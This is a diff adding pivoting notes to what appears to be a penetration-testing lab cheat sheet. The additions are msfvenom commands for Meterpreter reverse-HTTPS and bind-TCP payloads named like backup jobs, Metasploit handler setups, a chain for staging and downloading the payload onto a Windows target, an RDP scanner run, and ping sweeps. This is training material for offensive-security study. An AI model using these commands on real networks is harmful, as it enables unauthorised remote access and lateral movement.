@@ -174,3 +174,98 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o bac
 ```
 
 * Transfer and execute payload on Windows host to get Meterpreter session
+
+---
+
+## Payload Generation for Pivoting
+
+### Windows Reverse HTTPS (through SSH reverse port forward)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+
+### Windows Bind TCP (for socat bind shell relay)
+
+```bash
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+```
+
+---
+
+## Handler Configurations
+
+### Reverse HTTPS (for SSH reverse port forward)
+
+```
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8000
+msf6 exploit(multi/handler) > run
+```
+
+### Bind TCP (for socat bind shell relay)
+
+```
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(multi/handler) > set RHOST 10.129.202.64
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > run
+```
+
+---
+
+## Pivot File Transfer Chain
+
+SCP payload to pivot host:
+
+```bash
+scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
+```
+
+Start HTTP server on pivot:
+
+```bash
+python3 -m http.server 8123
+```
+
+Download on Windows target:
+
+```powershell
+Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+---
+
+## rdp_scanner Auxiliary Module
+
+```
+msf6 > search rdp_scanner
+msf6 > use 0
+msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
+msf6 auxiliary(scanner/rdp/rdp_scanner) > run
+```
+
+---
+
+## Ping Sweep One-Liners
+
+Linux bash:
+
+```bash
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+Windows CMD:
+
+```
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+Windows PowerShell:
+
+```powershell
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+```
